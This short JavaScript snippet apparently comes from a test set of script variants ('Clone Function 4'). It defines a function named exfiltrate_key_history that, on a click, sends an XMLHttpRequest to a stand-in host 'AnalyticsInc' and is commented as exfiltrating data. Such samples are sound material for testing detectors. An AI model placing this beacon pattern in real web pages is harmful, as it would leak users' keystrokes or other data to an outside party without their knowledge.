function exfiltrate_key_history() {

    // Clone Function 4
    // Exfiltrate data using XMLHTTP request
	newreq=XMLHttpRequest;
    xmlhttp=new newreq();
    xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=clone4", true);
    xmlhttp.send(null);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
